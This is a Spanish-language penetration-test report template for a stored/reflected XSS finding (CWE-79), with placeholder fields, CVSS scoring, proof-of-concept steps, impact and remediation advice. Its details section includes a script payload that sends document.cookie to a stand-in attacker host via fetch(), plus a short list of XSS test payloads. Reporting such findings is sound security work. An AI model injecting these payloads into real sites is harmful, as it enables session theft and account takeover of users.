# Cross-Site Scripting — Stored / Reflected (CWE-79) - {{Crítica | Alta | Media}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{8.4 (stored) / 5.1 (reflected)}}` |
| **CWE** | [CWE-79 – Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html) |
| **OWASP** | A03:2021 – Injection |
| **Estado** | {{Abierto}} |

## Descripción

El Cross-Site Scripting (XSS) ocurre cuando la aplicación incorpora entrada del usuario
en una página sin sanitizar ni codificar correctamente, permitiendo la ejecución de
JavaScript arbitrario en el navegador de la víctima. En la variante **almacenada
(stored)** el payload se persiste y se sirve a otros usuarios; en la **reflejada
(reflected)** se entrega de vuelta en la respuesta a partir de la petición. Permite robo
de sesión, acciones en nombre de la víctima y compromiso de cuentas.

## Componentes Afectados

- `{{https://app.cliente.com/profile}}` · campo `{{nombre / comentario / descripción}}`
- **Parámetros:** `{{name}}`, `{{comment}}`, `{{q}}`

## Detalles

Se identificó que el campo `{{name}}` no sanitiza la entrada, almacenando y ejecutando
HTML/JS al renderizarse.

**Paso 1 — Inyección del payload**

```http
POST /profile HTTP/1.1
Host: app.cliente.com
Authorization: Bearer {{TOKEN}}
Content-Type: application/json

{"name":"<script>fetch('https://atacante.oastify.com/c?'+document.cookie)</script>"}
```

**Payloads de prueba**

```html
<script>alert(document.domain)</script>
"><img src=x onerror=alert(document.cookie)>
<svg/onload=alert(1)>
javascript:alert(1)            <!-- en contextos de href/URL -->
```

**Paso 2 — Ejecución al visualizar el recurso**

```http
GET /profile/{{id}} HTTP/1.1
Host: app.cliente.com
```

```http
HTTP/1.1 200 OK
...<span><script>fetch('https://atacante.oastify.com/c?'+document.cookie)</script></span>...
```

> _Figura {{N}}: el payload se ejecuta en el navegador de la víctima (alert / exfiltración de cookie a Burp Collaborator)._

## Impacto

Permite robar tokens de sesión/cookies, suplantar a la víctima, ejecutar acciones en su
nombre (incluida la cuenta de administrador), realizar phishing en el dominio confiable y,
encadenado, comprometer cuentas. El XSS almacenado afecta a todo usuario que vea el contenido.

## Remediación

- Codificar la salida según el contexto (HTML, atributo, JS, URL) al renderizar datos del usuario.
- Validar/sanitizar la entrada con una librería robusta (p. ej. DOMPurify para HTML enriquecido).
- Implementar una Content-Security-Policy estricta (sin `unsafe-inline`/`unsafe-eval`).
- Marcar cookies de sesión como `HttpOnly`, `Secure` y `SameSite`.

## Referencias

- https://cwe.mitre.org/data/definitions/79.html
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://owasp.org/Top10/A03_2021-Injection/
